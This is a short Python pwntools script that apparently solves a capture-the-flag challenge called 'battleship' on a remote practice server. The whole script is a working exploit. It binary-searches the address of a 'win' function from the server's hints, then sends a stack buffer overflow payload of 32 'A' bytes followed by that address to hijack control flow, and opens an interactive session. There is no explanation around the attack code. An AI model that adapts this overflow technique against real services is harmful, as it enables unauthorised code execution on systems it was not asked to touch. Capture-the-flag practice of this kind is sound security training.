from pwn import *

context.log_level = "debug"
io = remote("skillsusa.cybr.club", 443, ssl=True, sni="battleship")

low = 0
high = 9223372036854775807

while low <= high:
    mid = (low + high) // 2
    
    io.recvuntil("Guess the address of the win function")
    io.sendline(hex(mid)[2:])  # Send without '0x' prefix
    
    response = io.recvuntil(("Too low", "Too high", "Uh Oh"), drop=False).decode()
    debug(f"Response: {response}")
    
    if "Too low" in response:
        low = mid + 1
    elif "Too high" in response:
        high = mid - 1
    elif "Uh Oh" in response:
        win_addr = mid
        log.success(f"Found win address: {hex(win_addr)}")
        break

    io.recvuntil("Try again? (y/N)")
    io.sendline("y")

# Say no to exit the loop
io.recvuntil("Try again? (y/N)")
io.sendline("N")

io.recvuntil("Now say goodbye:")

payload = b"A" * 32 + p64(win_addr)
io.sendline(payload)

io.interactive(prompt="")